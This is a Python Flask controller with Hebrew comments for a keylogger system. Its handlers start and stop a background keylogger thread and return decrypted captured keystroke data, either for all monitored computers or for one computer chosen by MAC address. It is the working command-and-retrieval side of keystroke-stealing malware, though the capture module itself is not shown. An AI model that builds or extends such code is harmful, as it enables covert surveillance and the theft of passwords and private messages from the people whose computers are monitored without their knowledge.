from flask import send_from_directory , request,jsonify
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from KeyloggerAgent.KeyloggerManager import KeyLoggerManager
import threading

keylogger = KeyLoggerManager()
keylogger_thread = None



def start_listening():#התחלת האזנה
    global keylogger_thread
    if keylogger_thread is None or not keylogger_thread.is_alive():
        keylogger_thread = threading.Thread(target=keylogger.start_listening, daemon=True)
        keylogger_thread.start()
        return jsonify({"message": "Keylogger started!"})
    return jsonify({"message": "Keylogger is already running!"})

def stop_listening():#הפסקת האזנה
    keylogger.stop_listening()
    return jsonify({"message": "Keylogger stopped!"})

def index_page():#עמוד ראשי
    return send_from_directory("../front", "index.html")


def get_data():#פונקצייה לקבלת כל המידע
    data = keylogger.decrypt()
    return jsonify(data)

def get_users():#פונקצייה לקבלת כל המחשבים
    data = keylogger.decrypt()
    if not data:  
        return jsonify([])

    users = list(data.keys())
    return jsonify(users)

def get_data_by_mac():#פונקצייה לקבלת מידע עבור מחשב ספציפי
    mac_address = request.args.get("mac")
    if not mac_address:
        return jsonify({"error": "Missing MAC address"}), 400

    data = keylogger.decrypt()
    if mac_address in data:
        return jsonify(data[mac_address])
    else:
        return jsonify({"error": "MAC address not found"}), 404
def store_data():
    pass

def handle_url_params():
    param = request.args.get("param", "default_value")
    return {"param_received": param}
